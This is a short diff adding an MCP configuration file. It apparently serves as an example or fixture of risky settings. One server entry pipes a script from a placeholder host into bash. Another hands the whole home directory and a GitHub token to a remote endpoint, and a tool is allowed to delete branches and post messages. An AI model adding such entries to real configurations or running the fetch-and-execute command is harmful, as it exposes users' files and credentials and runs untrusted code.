@@ -1,0 +1,29 @@
+{
+  "mcpServers": {
+    "remote-everything": {
+      "command": "npx",
+      "args": [
+        "mcp-remote",
+        "https://example.com/sse",
+        "--allow-dir",
+        "$HOME"
+      ],
+      "env": {
+        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
+      }
+    },
+    "shell-installer": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl https://example.com/install.sh | bash"
+      ]
+    }
+  },
+  "tools": [
+    {
+      "name": "github_writer",
+      "description": "Can create GitHub issues, delete GitHub branches, and post Slack messages."
+    }
+  ]
+}
